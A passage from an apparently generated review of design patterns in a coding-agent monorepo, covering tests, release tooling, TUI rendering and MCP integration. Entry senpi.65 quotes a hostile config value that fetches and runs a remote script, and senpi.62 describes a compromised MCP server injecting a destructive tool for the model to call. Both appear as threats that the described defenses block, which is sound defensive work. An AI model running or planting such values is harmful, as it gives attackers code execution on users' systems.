- **how:** Root AGENTS.md: "New coding-agent lifecycle tests go in `test/suite/`; when a regression test fixes a GitHub issue, add a comment with the issue number next to the test; the flat `test/*.test.ts` root cluster is legacy placement and must not grow." Live/credentialed surfaces are opt-in via env (`PI_RUN_INTEGRATION=1`, `PI_ENABLE_*`), and `test/setup.ts` force-overrides the state dir into a temp dir.
- **solves:** Making a hostile-input surface (a coding agent with shell access) testable at all, and keeping every regression permanently pinned to a named issue.
- **port effort:** Low to adopt the conventions; the ratio itself is a maturity marker, not a target. The "flat root cluster must not grow" rule is the portable part. | **idea only:** True

## senpi.33 Build and release scripts tested as first-class code

- **where:** `scripts/`, run by `npm run test:scripts` = `node --test scripts/*.test.mjs`.
- **what:** ~50 of the 199 files in `scripts/` are `*.test.mjs` siblings of release/publish/build tooling: `build-binaries-workflow.test.mjs`, `publish-workflow.test.mjs`, `check-lockfile-commit.test.mjs`, `install-lock-validation.test.mjs`, `changelog-checkout.test.mjs`, and so on.
- **how:** Examples of what gets asserted: `build-all.test.mjs` pins the topologically-ordered build phases and asserts `packages/chord` builds before every dependent; another test asserts exact `BUILD_PHASES[0] === ["packages/chord"]`.
- **solves:** Release pipelines fail at the worst possible time and are usually untested. Here the publish graph, lockfile policy and workflow YAML are all covered by ordinary unit tests in the normal `bun run test` path.
- **port effort:** Medium. Adopting the discipline of putting a `.test.mjs` next to every pipeline script is the whole idea. | **idea only:** True

## senpi.34 Executable evidence gate: no QA receipt, no commit

- **where:** `.agents/skills/senpi-qa/` (146 files, its own package.json + lockfile, described as a "private dependency island outside the workspace"); `scripts/tracked-harness-artifacts-audit.test.mjs` fails the build if anything under `.omo/`, `local-ignore/`, `.qa-evidence/`, `qa-evidence/` is tracked.
- **what:** Changes under the release-managed packages require real-CLI QA receipts saved under `local-ignore/qa-evidence/<YYYYMMDD>-<slug>/`, summarized in the PR body with a `sha256sum` line per file, and never committed.
- **how:** Evidence stays local by construction; only a decisive excerpt plus checksums cross into the PR. Root AGENTS.md adds: "Evidence, logs, comments, and PR bodies must never contain tokens, credentials, auth headers, cookies, or raw environment dumps."
- **solves:** An agent-driven workflow otherwise accumulates local working state (plans, transcripts, scratch) that quietly becomes permanent repo content and eventually leaks.
- **port effort:** Low. The audit test is ~50 lines and the concept is fully portable. | **idea only:** True

## senpi.35 Merge-gating PR claim labels

- **where:** Root `AGENTS.md` section "Review claim labels (merge-gating)"; automation in `.github/workflows/review-claims.yml` (267 lines).
- **what:** Three labels drive review workflow: `will-review` (claimed, not started), `in-review` (active), `stale-review` (a claim aged 3+ days; the sweep removes the claim labels and applies this). Applying either claim label auto-requests a labeler and BLOCKS merge via a required `Review claim gate` check.
- **how:** Claim labels are removed automatically ONLY when the claimer themself submits an approve/request-changes review; the rules explicitly forbid hand-removing someone else's claim.
- **solves:** Multi-agent / high-throughput branches where a reviewer announces intent but the PR can still merge underneath them.
- **port effort:** Medium. Portable if you use GitHub required checks; needs adapting if your review flow differs. | **idea only:** True

## senpi.36 CalVer lockstep versioning with documented, code-enforced exceptions

- **where:** `scripts/release-packages.mjs` (`WORKSPACE_PACKAGES`, `BUNDLED_INTERNAL_WORKSPACES`), `scripts/sync-versions.js` (`INDEPENDENT_VERSION_PACKAGE_NAMES`), `scripts/calver.mjs`.
- **what:** 11 packages share `2026.9.28-3`. Three packages deliberately do not, and each exception is enforced in code with a comment citing the reason and the issue number.
- **how:** chord keeps upstream `0.85.1` because it is byte-for-byte upstream (issue #1632) and must resolve its own declared edges to upstream's published version; sqlite-node keeps `0.83.0` because it is not reachable from the shipped runtime. Internal deps still get re-synced to workspace versions; `file:`/`link:`/`workspace:`/`npm:` specifiers are explicitly skipped so local installs don't break.
- **solves:** A monorepo that vendors a subset of upstream cannot run naive lockstep versioning without either lying about the vendored package's identity or breaking its dependency resolution.
- **port effort:** Medium. The pattern — declare the exception list in one place with a reason and an issue link — is the reusable part. | **idea only:** True

## senpi.37 Extension-authoring curriculum as executable examples

- **where:** `packages/coding-agent/examples/extensions/` (115 tracked files) with its own `README.md` and `AGENTS.md`.
- **what:** ~60 standalone extension examples under `packages/coding-agent/examples/extensions/`, ranging from 355-byte `widget-placement.ts` and 628-byte `hello.ts` to `ssh.ts`, `interactive-shell.ts`, `subagent/`, `plan-mode/`, `sandbox/`, `gondolin/`, `space-inviders.ts` and a vendored `doom-overlay/` (with its own doom.wasm).
- **how:** Each is a real loadable extension (`package.json` `"pi": {"extensions": ["./index.ts"]}`). Five of them are also declared as npm/pnpm workspaces so they resolve against the monorepo rather than the registry.
- **solves:** Making the extension API learnable by reading rather than by reading the core.
- **port effort:** Low. Cheap and high-value if you have a plugin surface worth teaching. | **idea only:** True

## senpi.38 Model/provider layer split by axis (metadata vs wire), with a faux provider for tests

- **where:** `packages/ai/src/providers/`, `packages/ai/src/api/`, `packages/ai/src/tool-call-middleware/` (57 files, incl. a `recovery-*` stream-failure family).
- **what:** 112 provider entries as `<vendor>.ts` + `<vendor>.models.ts` pairs (metadata/identity), and 59 wire implementations in `src/api/` (streaming/protocol). Every wire impl has a `.lazy.ts` sibling for browser-safe lazy loading. `src/providers/faux.ts` (24 KB) is a test provider.
- **how:** The `.lazy.ts` convention is the documented exception to the repo-wide "no inline/dynamic imports" rule, so browser-safety is visible in the filename rather than in a comment.
- **solves:** Keeping "what model is this" separable from "how do I talk to it", so adding a vendor is usually one metadata file plus one wire file.
- **port effort:** Medium. The naming convention and the lazy-sibling rule are cheap; the 45 committed data JSONs are a per-project cost. | **idea only:** True

## senpi.39 Extension system as the primary feature-delivery mechanism

- **where:** packages/coding-agent/src/core/extensions/ (types.ts 102 KB, runner.ts 67 KB, builtin/index.ts, loader.ts 34 KB)
- **what:** 44 in-tree builtin extensions + 4 global defaults register tools, slash commands, renderers, widgets, and hooks through a single public `pi` API instead of touching core.
- **how:** Each is a pure `default function(pi: ExtensionAPI)` factory registered by id in `builtinExtensions[]`; the runner dispatches 30+ events and wires `ctx` (cwd, model, session manager) per-handler rather than via globals.
- **solves:** Feature growth without core churn: the docs state every fork feature that *can* be an extension *is* one, keeping `interactive-mode.ts` from becoming the place where features land.
- **port effort:** medium-high — the API shape ports, but the registration-order coupling comments show how much ordering is load-bearing and must be re-derived per host | **idea only:** False

## senpi.40 Fully rebindable keybinding layer with live help re-render

- **where:** packages/tui/src/keybindings.ts (47 tui.*), packages/coding-agent/src/core/keybindings.ts (49 app.*), packages/coding-agent/src/modes/interactive/help-content.ts
- **what:** 96 keybindings in 5 namespaces (tui.editor.*, tui.input.*, tui.select.*, tui.altScreen.*, app.*), centrally defined, user-overridable from a config file, and rendered live into /help tables.
- **how:** `buildKeybindingTables()` iterates the live KEYBINDINGS map and calls `keyDisplayText(id)` at render time, so a remap changes the help output, the footer hints, and the shortcut overlay in one pass.
- **solves:** Keybinding hints drift from reality in every TUI that hardcodes strings; this makes drift structurally impossible and gives users a supported customization path.
- **port effort:** low — the pattern is small and self-contained; the value is the discipline (no inline key literals anywhere in components) | **idea only:** True

## senpi.41 Extension-replaceable chrome: footer, header, widgets, editor, working indicator

- **where:** packages/coding-agent/src/core/extensions/types.ts (~180-330), implemented in packages/coding-agent/src/modes/interactive/interactive-mode.ts showExtensionCustom / setFooter / setEditorComponent
- **what:** ctx.ui can replace the footer, the header, arbitrary editor widgets, the whole input editor, the working spinner frames, and the hidden-thinking label.
- **how:** `custom<T>(factory, {overlay, overlayOptions, onHandle})` swaps the editor container in place and restores the saved editor text on close; `setFooter` receives a `ReadonlyFooterDataProvider` so extensions get git branch / context usage / token stats without reaching into core.
- **solves:** A host product (or a user) can restyle the entire chrome without a fork, and the data provider pattern means they don't need privileged access.
- **port effort:** low-medium — idea only; the ReadonlyFooterDataProvider indirection is the reusable part | **idea only:** True

## senpi.42 Overlay stack with a 9-point anchor grid and percentage sizing

- **where:** packages/tui/src/tui.ts:421-568 (OverlayAnchor, OverlayOptions, OverlayHandle, OverlayStackEntry)
- **what:** Overlays are positioned by anchor + offset, sized by number or percentage, can self-hide below a terminal size via a `visible(termW, termH)` predicate, and return a handle for focus/blur control.
- **how:** `showOverlay` pushes an entry; `compositeOverlays` splices rendered lines into the frame *before* the differential compare, so overlays are diffed like everything else; `nonCapturing` overlays render without stealing keyboard focus.
- **solves:** Modal surfaces in a differential renderer usually mean either a full repaint or a second rendering path. Compositing pre-diff keeps one path.
- **port effort:** medium — the pre-diff composite point is the load-bearing idea; the anchor algebra is easy to re-derive | **idea only:** True

## senpi.43 Three-tier render scheduler (forced / input-expedited / fps-throttled)

- **where:** packages/tui/src/tui.ts:1490-1580 (requestRender, setMaxRenderFps, commitExpeditedRender, scheduleRender)
- **what:** requestRender has three distinct paths: force=true repaints from a clean slate, source="input" bypasses the fps cap entirely for keystroke latency, and everything else is throttled by a configurable 30-120fps cap.
- **how:** Non-input renders coalesce via `renderRequested` + setTimeout; input renders go through `process.nextTick(commitExpeditedRender)` which clears any pending timer so a keystroke never waits behind a queued frame.
- **solves:** The classic TUI tradeoff: a global fps cap makes typing feel laggy, no cap makes streaming burn CPU. Splitting the input path out of the cap solves both.
- **port effort:** low — small, self-contained, high value for any streaming TUI | **idea only:** True

## senpi.44 Session tree with folding, filtering, label editing, and branch navigation

- **where:** packages/coding-agent/src/modes/interactive/components/tree-selector.ts, keybindings app.tree.* (11 bindings incl. app.tree.filter.cycleForward/Backward)
- **what:** A 1,458-LOC tree selector: flatten, gutters, active-path highlight, folding, 6 filter modes, horizontal viewport, copy/text extraction, and inline label editing.
- **how:** TreeList + TreeSelectorComponent; the /tree command opens it, and `treeFilterMode` is a persisted setting that picks the default filter.
- **solves:** Forking/rewinding a long agent conversation without losing the branch structure — the session history is a tree, not a list.
- **port effort:** medium — idea only; the fold/filter keybinding taxonomy (app.tree.filter.default/noTools/userOnly/labeledOnly/all) is the reusable idea | **idea only:** True

## senpi.45 Codex app-server protocol compatibility layer

- **where:** packages/coding-agent/src/modes/app-server/ (protocol/methods.ts, protocol/generated/v2/ 527 files, threads/, transports/, search/)
- **what:** 228 JSON-RPC methods/notifications matching the Codex app-server wire protocol, over stdio / Unix socket / authenticated WebSocket, with 619 generated protocol type files.
- **how:** Protocol is *generated* from a pinned Codex checkout (`generate-app-server-protocol.sh --from-checkout`), then wrapped by a hand-written app-facing facade (protocol/thread.ts, turn.ts, account.ts…) so runtime code never imports the generated tree directly.
- **solves:** Reusing an existing ecosystem's client apps (the Codex desktop/IDE clients) against a different agent runtime, without hand-maintaining hundreds of wire types.
- **port effort:** high — the generate-from-oracle + facade pattern is the reusable idea, not the 527 files | **idea only:** True

## senpi.46 Slash-command dispatch regression test

- **where:** packages/coding-agent/test/suite/builtin-slash-command-dispatch.test.ts
- **what:** A test that iterates BUILTIN_SLASH_COMMANDS and asserts each one never reaches `session.prompt()`.
- **how:** Stubs the InteractiveMode prototype via a Proxy that auto-vivifies vi.fn() for unknown members, installs the real `setupEditorSubmitHandler`, and asserts prompt/onInputCallback/showError are all uncalled per command.
- **solves:** A slash command with no dispatch branch silently falls through and is sent to the *model* as a user message — this is exactly how /thinking broke (#1437).
- **port effort:** low — cheap, high value; note the known gap in findings | **idea only:** True

## senpi.47 `$skill` token invocation alongside `/command`

- **where:** packages/tui/src/dollar-invocation-autocomplete.ts, dollar-invocation-autocomplete.ts docs in packages/tui/AGENTS.md
- **what:** A `$` at a whitespace boundary opens the same popup as `/`, but inserts bare `$name` for skills; anywhere but first position it offers skills only.
- **how:** `CombinedAutocompleteProvider.getMentionRanges(line)` reports resolved mentions so the editor styles each fragment independently of the cursor grapheme; shell-like `$HOME`/`$1` stay literal.
- **solves:** Skill invocation without eating a slash-command namespace, and without false-positives on shell variables users type naturally.
- **port effort:** low-medium — idea only; the mention-range styling split is the subtle part worth copying | **idea only:** True

## senpi.48 Settings menu generated from a single typed descriptor array

- **where:** packages/coding-agent/src/modes/interactive/components/settings-selector.ts (945 LOC), core/settings-manager.ts (78 KB)
- **what:** 35 settings entries, each a `{id, label, description, currentValue, values}` object or a `submenu` factory, rendered by one SettingsList component.
- **how:** Splat the array with 8 conditional `splice` insertions for image-dependent and always-available toggles; nested `submenu` factories return SelectSubmenu / ThemeSubmenu / WarningSettingsSubmenu.
- **solves:** One declarative list drives the whole settings UI, so adding a setting is a single array entry rather than a new dialog.
- **port effort:** low — idea only | **idea only:** True

## senpi.49 Two screen models over one component set

- **where:** packages/tui/src/tui-main-screen.ts, tui-alt-screen.ts (60 KB), layout.ts, layout-node.ts, ScrollView; design doc tui-plan.md (36 KB)
- **what:** `TuiMainScreen` delegates scrolling to the terminal; `TuiAltScreen` uses a constrained layout tree with a fixed bottom region (pending/status/widgets/editor/footer) and a scrollable transcript.
- **how:** The layout tree is rebuilt on every requested render while component state is preserved; leaf render caches (Markdown, Text, Image) are reused rather than duplicated. tui-plan.md explicitly enumerates what main-screen *cannot* do (sticky rows, nested scroll, side-by-side panes, off-screen repaint) and why.
- **solves:** Keeping normal terminal scrollback (users can scroll back with the wheel after exit) while still offering a fixed-input fullscreen mode — without pretending one model does both.
- **port effort:** high for the implementation; high value for the *document* — tui-plan.md's "why the two models differ" section is the reusable artifact | **idea only:** True

## senpi.50 Brand layer: one product name, many deployment identities

- **where:** packages/coding-agent/src/config.ts:564-577, packages/coding-agent/src/core/brand.ts, brand-dir-migration.ts, legacy-senpi-dir-migration.ts
- **what:** `BRAND` supplies name, command, configDir, envPrefix, userAgent, and an optional update channel; the whole app reads APP_NAME from it.
- **how:** `APP_NAME = BRAND?.name || piConfigName || "pi"`; unset brand falls back to `pi`, which is how the fork runs as both `senpi` and upstream-compatible `pi`.
- **solves:** Shipping a fork under a new name (and env var prefix, config dir, and update channel) without forking every string.
- **port effort:** low — small file, high leverage | **idea only:** True

## senpi.51 Account display names layered over opaque credential IDs

- **where:** packages/coding-agent/src/core/extensions/builtin/account/, account-display-name.ts, help-content.ts "Account display names" section, footer.ts accountFooterSuffix
- **what:** Users can rename accounts to human labels; the label is display-only and every operation (pins, removal, refresh, session affinity) still uses the unchanged ID.
- **how:** Labels are NFC-normalized, whitespace-collapsed, capped at 32 terminal columns, and compared with case/compatibility-form/invisible-codepoint/Cyrillic-lookalike folding so two visually identical labels cannot coexist. Environment accounts cannot be renamed.
- **solves:** Multi-account setups (5 Claude seats, N Cursor logins) where the raw IDs are unusable in a status bar. The anti-collision folding is the non-obvious part.
- **port effort:** low-medium — idea only; the lookalike-folding rule is worth copying verbatim | **idea only:** True

## senpi.52 Alt-screen transcript search

- **where:** packages/tui/src/alt-screen-search.ts (findAltScreenSearchMatches), keybindings tui.altScreen.search/searchNext/searchPrevious/searchClose
- **what:** Incremental search across the fullscreen transcript with match navigation, independent of the editor's own history search.
- **how:** Matches are computed over rendered segments and keyed by a stable match key so the highlight survives re-render.
- **solves:** Scrolling back through a long fullscreen session without leaving the mode or using the mouse.
- **port effort:** low — idea only | **idea only:** True

## senpi.53 CLI verb dispatch is route-first, not import-first

- **where:** packages/coding-agent/src/cli/deferred-commands.ts (documented rationale), cli/app-server-command.ts, cli/auth-command.ts
- **what:** argv[0] is compared against a tiny literal table so heavy command graphs stay behind dynamic import and are only paid for when selected.
- **how:** `PACKAGE_COMMAND_ARGV` uses `satisfies Record<PackageCommand, true>` so adding a PackageCommand member is a compile error rather than a dead route; the two string literals are pinned by test/suite/regressions/1781-main-lazy-modes.test.ts.
- **solves:** Every launch (interactive, print, RPC) was evaluating the 70-module app-server tree and package-manager CLI before argv was even parsed.
- **port effort:** low — idea only; the `satisfies`-pins-the-table trick is the reusable bit | **idea only:** True

## senpi.54 Session share as a secret GitHub gist

- **where:** packages/coding-agent/src/core/slash-commands.ts (entry 9), handled in interactive-mode.ts:4838
- **what:** /share uploads the session to a secret gist and prints the link.
- **how:** Listed in BUILTIN_SLASH_COMMANDS with description "Share session as a secret GitHub gist".
- **solves:** Getting a repro out of a live session with one keystroke.
- **port effort:** low — idea only | **idea only:** True

## senpi.55 HTML session export with an interactive viewer

- **where:** packages/coding-agent/src/core/export-html/ (template.html, template.css, template.js, ansi-to-html.ts, tool-renderer.ts), also reachable via `--export <file>`
- **what:** /export defaults to a self-contained HTML file; a 78 KB template.js and 23 KB template.css render the transcript with tool output, images, and ANSI converted to HTML.
- **how:** ansi-to-html.ts converts terminal output; the JS template handles interactivity client-side.
- **solves:** Sharing a readable transcript without the recipient running a terminal.
- **port effort:** medium — idea only | **idea only:** True

## senpi.56 Working indicator is fully user/extension-configurable

- **where:** packages/coding-agent/src/core/extensions/types.ts (setWorkingIndicator/setWorkingMessage/setWorkingVisible), modes/interactive/working-status.ts
- **what:** Custom spinner frames, hide-all (`frames: []`), static indicator (`frames: ["●"]`), custom working message, and visibility toggle — all via ctx.ui.
- **how:** The working row also carries elapsed time, the active-tool label, and the interrupt hint: `formatWorkingStatusMessage(msg, s, key)` → `"msg (1m 23s • esc to interrupt)"`.
- **solves:** Makes the "is it stuck?" question answerable at a glance, and lets integrations restyle it without a fork.
- **port effort:** low — idea only; the elapsed+tool+interrupt single-line format is worth copying | **idea only:** True

## senpi.57 Per-provider account footer with HRW slot prediction

- **where:** packages/coding-agent/src/modes/interactive/components/footer.ts (accountFooterSuffix), packages/coding-agent/src/core/footer-data-provider.ts
- **what:** The footer shows `@label` for the credential slot that will actually serve this session, computed with rendezvous hashing — and only when the provider pools more than one slot.
- **how:** `rendezvousOrder(sessionId, slots, sha256 → readBigUInt64BE)` picks the same winner the rotation engine will, so the label is a prediction, not a guess.
- **solves:** In a 5-account rotation, the user can see which seat is billing this turn before it happens.
- **port effort:** medium — idea only | **idea only:** True

## senpi.58 Bash prefix modes in the editor

- **where:** packages/coding-agent/src/modes/interactive/interactive-mode.ts:4590, 4966-4977
- **what:** `!` runs bash and adds command+output to context; `!!` runs it without adding to context; the editor border/mode indicator tracks bash mode live.
- **how:** `isBashMode = text.trimStart().startsWith("!")`, recomputed on every editor change with a was/is diff so only transitions re-render.
- **solves:** Shell access without a separate tool call round-trip, with an explicit opt-out of context pollution.
- **port effort:** low — idea only | **idea only:** True

## senpi.59 Shortest-path shortcut overlay on empty editor

- **where:** packages/coding-agent/src/modes/interactive/components/shortcut-overlay.ts
- **what:** Pressing `?` on an empty editor shows a two-column keyboard shortcut grid; any key dismisses it.
- **how:** `shouldShowShortcutOverlay` requires prevText==="" && nextText==="?" && inputKind==="typed"; `classifyEditorInput` treats a >1-char jump as a paste so pasting "?" never triggers it. All labels come from `keyHint(keybindingId, …)`.
- **solves:** Zero-friction keybinding discovery that respects the user's remaps.
- **port effort:** low — idea only; the paste-vs-typed guard is the non-obvious part | **idea only:** True

## senpi.60 Four bundled JSON themes plus an automatic light/dark mode

- **where:** packages/coding-agent/src/modes/interactive/theme/ (4 .json + theme-schema.json 9.6 KB), theme-controller.ts, terminal-theme-cache.ts; packages/tui/src/terminal-colors.ts (parseOsc11BackgroundColor, parseTerminalColorSchemeReport)
- **what:** dark, light, grok-day, grok-night as JSON assets, plus an "Automatic" mode that queries the terminal's OSC color-scheme report and picks per appearance.
- **how:** ThemeSubmenu has single/automatic modes; `parseAutoThemeSetting` encodes the pair as "light/dark". Themes are copied by build scripts, never symlinked.
- **solves:** Theme that follows the terminal's own appearance instead of fighting it.
- **port effort:** low — idea only; OSC color-scheme query support is broadly reusable | **idea only:** True

## senpi.61 MCP 3-mode exposure policy (direct / search / proxy) with an auto threshold

- **where:** packages/coding-agent/src/core/extensions/builtin/mcp/expose/policy.ts (95 lines) + config-schema.ts:47 + expose/tier-b.ts
- **what:** Every configured MCP server is classified into one of three exposure modes. `direct` registers all tools immediately; `search` registers the full catalog but keeps only `directTools` active, promoting the rest on demand via a shared `tool_search`; `proxy` hides the whole catalog behind a single gateway tool. `auto` picks direct when the filtered catalog is <= `settings.searchThreshold` (default 10), else search.
- **how:** Pure function `computeMcpExposurePolicy(entries, config, settings) -> {activeEntries, filteredEntries, mode, reason, registeredEntries, warnings}`. The `auto` branch structurally has no path to `proxy`.
- **solves:** A 392-tool MCP server would otherwise blow the context window on every turn. The policy makes catalog size nearly free until the model actually asks.
- **port effort:** MEDIUM. The idea ports cleanly; the code does not — omp's MCP is hand-rolled with a different substrate (see findings). Expect to reimplement the policy against omp's `packages/coding-agent/src/mcp/manager.ts` + `tool-bridge.ts`. | **idea only:** True

## senpi.62 Rug-pull defense on list_changed

- **where:** notifications.ts, service-tools-changed.ts, active-set.ts (`registerToolsPreservingActiveSet`)
- **what:** When a server pushes `notifications/tools/list_changed`, newly-added tools enter INACTIVE and are never auto-activated; only `directTools` entries are active immediately. Removed tools are force-dropped and replaced with a tombstone definition so a stale `execute()` returns a clean `isError` instead of throwing.
- **how:** Active-set is snapshotted via `getActiveTools()` and restored via `setActiveTools()` around `registerTool` calls, so registering never widens the active set.
- **solves:** A compromised or merely-upgraded MCP server can silently add a destructive tool mid-session and have the model call it. This makes server-side tool injection inert by default.
- **port effort:** LOW-MEDIUM. Small, self-contained, high value. Portable as a pattern regardless of substrate. | **idea only:** True

## senpi.63 Single-flight MCP session attach + history rehydration

- **where:** mcp/service.ts, mcp/startup-race.ts (201 lines), mcp/reconnect.ts
- **what:** `attachPromise` memoizes the in-flight `attachSession` so concurrent `before_agent_start` handlers await the original attach instead of starting a second one that would collect an empty catalog. For resumed sessions, `#rehydrateFromSessionHistory` runs at attach time so the very first wire payload already contains previously-promoted tools; `maybeRehydrateFromHistory` on the `context` event is a safety-net replay.
- **how:** Memoized promise + a startup-race guard; test/suite/startup-race-single-registration.test.ts and startup-race.test.ts pin the behavior.
- **solves:** Two lifecycle hooks both trying to connect the same server races the transport, loses the tool catalog, and leaves a half-initialized connection.
- **port effort:** LOW. ~30 lines of coordination logic. Idea-only but trivially reimplementable. | **idea only:** True

## senpi.64 OAuth 2.1 for MCP with hardened cross-process token storage

- **where:** mcp/auth/ (9 files, incl. token-store.ts, oauth.ts, oauth-refresh.ts, callback.ts) + oauth/pkce.ts
- **what:** Full OAuth 2.1: discovery, PKCE S256, RFC 8707 resource binding, loopback callback or paste flow, and a `client_credentials` flow for headless machine-to-machine. Tokens persist at `<agentDir>/mcp-auth/<sha256(serverUrl)>/tokens.json` — the server URL is hashed so the path leaks nothing — with the directory at 0700 and files at 0600, written via tmp+rename, guarded by a cross-process `proper-lockfile` (retries 50, stale 30s).
- **how:** `hashServerUrl` = sha256; `McpTokenStore` uses `mkdirSync(mode 0o700)` + explicit `chmodSync` (not just umask) because mkdir's mode is masked by the current umask.
- **solves:** Refresh races across concurrent agent processes corrupt token state, and a revoked-token cascade (token family invalidation) is exactly the case that exposes it — hence the test-only `disableLock` escape hatch to demonstrate the failure it prevents.
- **port effort:** LOW-MEDIUM for the storage hardening (omp already has `mcp/oauth-credentials.ts`); MEDIUM for the full flow set. | **idea only:** True

## senpi.65 Command-substitution rejection in MCP config values

- **where:** mcp/config.ts:329
- **what:** Config values support `${VAR}` interpolation from the trusted parent environment only. Any value that begins with `!` or contains `$(` throws `McpConfigValidationError` at load time.
- **how:** `if (value.trimStart().startsWith("!") || value.includes("$("))` — a two-token check that blocks both `!cmd` and `$(cmd)` shell forms.
- **solves:** `mcp.json` is a checked-in, human-edited file. Without this, a hostile PR adding `"env": {"X": "$(curl evil.sh|sh)"}` turns a config read into RCE.
- **port effort:** VERY LOW. One line. Should be adopted regardless of substrate. | **idea only:** True

## senpi.66 Deterministic collision-safe MCP tool naming under a hard 64-char cap

- **where:** mcp/expose/naming.ts, shared by both the full-tool builder and the Tier-B search catalog via `mapMcpCatalogNames`
- **what:** Tools are named `mcp_<server>_<tool>` with non-`[a-zA-Z0-9_-]` replaced by `_`. Names over 64 chars are middle-ellipsized, and post-normalization collisions (including `-` vs `_`, which providers treat as equivalent) get a deterministic `_` + sha1-4hex suffix rather than a random or index-based one.
- **how:** `buildMcpToolNames` groups by `matcherKey` (which folds `-` to `_`), warns on collision, then re-ellipsizes to `MCP_TOOL_NAME_MAX_LENGTH - suffix.length`. Determinism means a tool keeps its name across restarts, so transcripts stay readable.
- **solves:** Two servers exposing `list_files` collide; providers cap tool-name length; a non-deterministic suffix would rename tools on every reconnect and break prompt caching plus transcript references.
- **port effort:** VERY LOW. ~60 lines, no substrate dependency. Directly portable. | **idea only:** False

## senpi.67 Lazy SDK boundary guarding CLI startup cost

- **where:** mcp/sdk.lazy.ts (79 lines) + mcp/wrap.ts (type-only re-exports) + test/suite/regressions/1781-lazy-mcp-sdk.test.ts
- **what:** The MCP SDK (~claimed 210 files / 1.16 MB) is never statically reachable. Five memoized loaders pull in only the submodule a run actually needs: client, stdio transport, streamableHttp transport, types, auth. The HTTP loader also seats the auth module so `isMcpSdkUnauthorizedError` can use an `instanceof UnauthorizedError` identity check. Failed loads are deliberately not cached so a transient failure is retryable.
- **how:** `memoizeLoader` shares an in-flight promise; `wrap.ts` exports `export type { Server/Client }` with a comment explaining a value re-export would re-add the SDK to the startup graph. A regression test fails if a static edge to the SDK reappears in `dist/main.js`.
- **solves:** The mcp builtin is reachable from the builtin barrel, so every CLI start parsed and evaluated the whole SDK.
- **port effort:** N/A for omp — omp has no official SDK to defer. The *discipline* (a test that fails if a static edge reappears) is still worth copying. | **idea only:** True

## senpi.68 MCP lifecycle modes and idle shutdown with transparent reconnect

- **where:** mcp/idle.ts, mcp/health.ts, mcp/reconnect.ts, config-schema.ts, docs/mcp.md
- **what:** Three per-server lifecycles: `lazy` (connect on first use), `eager` (connect at session start), `keep-alive` (eager + 30s pings + auto-reconnect, never idles out). Separately, `idleTimeoutMin` (default 10) shuts down a quiet connected server while leaving its tools registered, so the next call reconnects transparently.
- **how:** Per-connection state machine plus `ensureMcpToolCallConnection` wrapping every execute, and `withMcpSessionExpiryRetry` / `withMcpRetriableFailedSendRetry` wrappers in expose/register.ts.
- **solves:** Dozens of configured MCP servers cost processes and memory even when the model never touches them, but killing them outright would make the next call fail.
- **port effort:** MEDIUM. Behavior is portable; implementation must be rebuilt against omp's manager. | **idea only:** True

## senpi.69 Shared host-level MCP connection registry with reference-counted leases

- **where:** mcp/host-registry.ts, shared-connection.ts, shared-lease.ts, sharing-policy.ts
- **what:** Multiple agents/sessions in one process share one physical MCP connection. `HostMcpRegistry` hands out refcounted leases keyed by server, with an opt-in `shareable` flag and a `sharedMcpKey(options, agentDir)` identity so the same server+agentDir collapses to one connection. Unknown-owner detach throws a typed `HostMcpRegistryError`.
- **how:** `attach(key, owner, factory, canShare)` finds an existing entry whose `owners` map contains the owner (refcount++), else a shareable one, else creates.
- **solves:** N agents each spawning their own stdio MCP child multiplies process count and causes servers to fight over the same child stdio channel.
- **port effort:** MEDIUM. omp is multi-agent (metaharness) so this is directly relevant, but the code is substrate-bound. | **idea only:** True

## senpi.70 MCP output guard with spill files

- **where:** mcp/guard/output-guard.ts (7.7 KB), wired in catalog.ts per-entry and applied in expose/register.ts
- **what:** Large MCP tool results are bounded by `outputGuard{maxBytes, maxLines, maxTokens}` and overflow is spilled to a file rather than truncated silently, so the model can read the rest.
- **how:** Per-catalog-entry `outputGuard` + `artifacts` (McpOutputArtifacts) so the spill file location is known to the renderer.
- **solves:** A single MCP tool returning 50MB of JSON would otherwise be truncated mid-JSON with no way for the model to recover the tail.
- **port effort:** LOW. Self-contained and highly reusable for ANY tool, not just MCP. | **idea only:** True

## senpi.71 Form-only MCP elicitation that works headless and over RPC

- **where:** mcp/elicitation.ts (127 lines); protocol types generated at src/modes/app-server/protocol/generated/v2/McpElicitation*.ts (24 files)
- **what:** MCP elicitation is implemented as form-only (no free-text), and the UI provider is injected at `before_agent_start` via `setMcpElicitationUiProvider`, so the same code path works under TUI, headless, and RPC.
- **how:** The client installs `setRequestHandler(ElicitRequestSchema, ...)` and delegates rendering to an injected provider, defaulting to a headless path when none is set.
- **solves:** A server that asks a question mid-turn must not hang or crash when no interactive UI exists.
- **port effort:** MEDIUM. omp has no elicitation layer visible; this is a genuine capability gap worth adopting. | **idea only:** True

## senpi.72 Fork-owned model catalogs that survive regeneration

- **where:** packages/ai/src/providers/{kimi-coding,devin}.models.ts; merged in providers/all.ts via FORK_OWNED_CATALOGS
- **what:** Two providers are hand-written specifically because a generation run emits neither their shard nor their data file: `kimi-coding.models.ts` (models.dev described it once and stopped) and `devin.models.ts` (real catalog is credential-scoped; runtime discovery replaces it once signed in, and the bare `swe-2` uid is deliberately absent because Cascade answers it with permission_denied).
- **how:** `BUILTIN_CATALOGS = { ...MODELS, ...FORK_OWNED_CATALOGS }` so every catalog read treats fork-owned identically to generated.
- **solves:** Regeneration silently deletes providers the upstream feed stopped describing, and ships a model id the endpoint rejects.
- **port effort:** MEDIUM as an idea. omp uses a KDL rule tree with explicit reviewed-override residue (per its AGENTS.md) — same intent, different mechanism, so adapt rather than copy. | **idea only:** True

## senpi.73 47-provider / 9-wire-protocol LLM surface with a two-tier registry

- **where:** packages/ai/src/{api-registry.ts, providers/all.ts, providers/data/*.json, api/*.ts}
- **what:** `builtinProviders()` constructs 47 providers; `getBuiltinProviders()` reads 43 static catalogs (42 generated + kimi-coding). 1,760 models across 9 wire protocols. Registration is a two-tier Map (global overlay + immutable builtin) with an optional provider-scope overlay, so a scope can shadow builtins without mutating them.
- **how:** `registerApiProvider(provider, sourceId?)` writes to the active scope's overlay or the global map; `registerBuiltinApiProvider` retains identity so existing scopes stay valid; `unregisterApiProviders(sourceId)` removes by provenance tag. A closed scope throws.
- **solves:** Scoped/ephemeral provider overrides (a test, a plugin, a sandbox) must not leak into or corrupt the process-wide builtin registry, and must be attributable so they can be withdrawn.
- **port effort:** HIGH. omp's catalog is a KDL rule tree compiled to rules.json (per its AGENTS.md, model policy must live in KDL, never in TS) — architecturally opposite to senpi's generated-JSON approach. Take the *scoped-overlay* idea, not the catalog. | **idea only:** True

## senpi.74 Lazy per-provider API module loading

